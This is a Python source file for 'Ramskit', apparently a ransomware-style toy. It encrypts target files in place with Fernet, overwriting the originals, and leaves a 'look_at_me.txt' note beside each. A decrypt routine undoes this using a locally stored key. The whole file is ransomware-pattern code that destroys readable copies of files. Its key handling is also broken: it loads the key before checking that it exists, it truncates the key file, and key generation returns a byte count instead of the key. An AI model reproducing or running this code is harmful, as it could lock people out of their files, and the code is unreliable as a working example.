#!/usr/bin/python3

""" Copyright (C) 2023, 2024 Luis De León

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. """

import collections.abc as collections

from cryptography.fernet import Fernet
import os.path

CURRENT = "v1.2.0"


# TODO: CLI tool for v1.2.1, updates Jan 2024
# TODO: Update CLI addition time for encrypt/decrypt for v2.0.1
class Ramskit:
    def __init__(self) -> None:
        print(f"[x] Starting Ramskit {CURRENT}")
        print("[x] Reading key...")
        self.key = Ramskit.load_key()

        if not self.key:
            print("[x] Key does not exist.\n"
                  "[x] Creating key...")

            with open('key.key', "wb") as f:
                self.key = Ramskit.generate_key()

    def encrypt_file(self, items: collections.Iterable, key: bytes) -> None:
        fernet = Fernet(key)

        for item in items:
            normalized_item = os.path.normpath(item)

            with open(normalized_item, 'rb') as file:
                data = file.read()

            encrypted = fernet.encrypt(data)

            with open(normalized_item, 'wb') as file:
                file.write(encrypted)

            directory = os.path.dirname(normalized_item)
            new_path = os.path.join(directory, 'look_at_me.txt')

            with open(new_path, 'w') as file:
                file.write(f"Hello, your file '{normalized_item}' has been encrypted. "
                           f"Use the '-a or --action decrypt' usage to decrypt this file!")

    def decrypt_file(self, items: collections.Iterable, key: bytes) -> None:
        fernet = Fernet(key)

        for item in items:
            normalized_item = os.path.normpath(item)

            with open(normalized_item, 'rb') as file:
                data = file.read()

            decrypted = fernet.decrypt(data)

            with open(normalized_item, 'wb') as file:
                file.write(decrypted)

            directory = os.path.dirname(normalized_item)
            new_path = os.path.join(directory, 'look_at_me.txt')

            if os.path.exists(new_path):
                os.remove(new_path)

    @staticmethod
    def generate_key() -> int:
        key = Fernet.generate_key()

        with open('key.key', 'wb') as file:
            return file.write(key)

    @staticmethod
    def load_key() -> bytes:
        with open('key.key', 'rb') as file:
            return file.read()


